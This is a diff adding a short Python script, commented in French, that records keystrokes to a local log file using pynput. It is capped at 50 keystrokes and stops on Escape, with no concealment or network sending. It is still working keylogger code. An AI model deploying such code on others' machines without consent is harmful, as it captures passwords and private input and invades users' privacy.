@@ -1,0 +1,47 @@
+from pynput import keyboard
+import datetime
+
+# Nombre de frappes après lequel le programme s'arrête (pour contrôle)
+MAX_KEYSTROKES = 50
+# Chemin du fichier où enregistrer les touches
+FICHIER_LOG = "enregistrement_clavier.txt"
+
+# Compteur pour limiter le nombre de frappes enregistrées
+compteur_frappes = 0
+
+# Écriture d'un en-tête dans le fichier pour signaler le début de l'enregistrement
+with open(FICHIER_LOG, "a") as fichier:
+    fichier.write(f"\n--- Début de l'enregistrement : {datetime.datetime.now()} ---\n")
+
+def on_press(key):
+    global compteur_frappes
+    compteur_frappes += 1
+    
+    # Gestion des touches spéciales et des touches standards
+    try:
+        touche = key.char if key.char else f"[Touche spéciale: {key}]"
+    except AttributeError:
+        touche = f"[Touche spéciale: {key}]"
+    
+    # Écriture de la touche pressée dans le fichier
+    with open(FICHIER_LOG, "a") as fichier:
+        fichier.write(f"{touche}\n")
+    
+    # Arrêter après un certain nombre de frappes
+    if compteur_frappes >= MAX_KEYSTROKES:
+        print("Nombre maximum de frappes atteint. Arrêt de l'enregistrement.")
+        return False  # Arrête le listener
+
+def on_release(key):
+    # Fin de l'écoute si la touche "Echap" est pressée
+    if key == keyboard.Key.esc:
+        print("Touche Échap pressée, fin de l'enregistrement.")
+        return False  # Arrête le listener
+
+# Création et lancement du Listener pour écouter les frappes clavier
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
+# Ajouter un marqueur de fin dans le fichier de log
+with open(FICHIER_LOG, "a") as fichier:
+    fichier.write(f"--- Fin de l'enregistrement : {datetime.datetime.now()} ---\n")
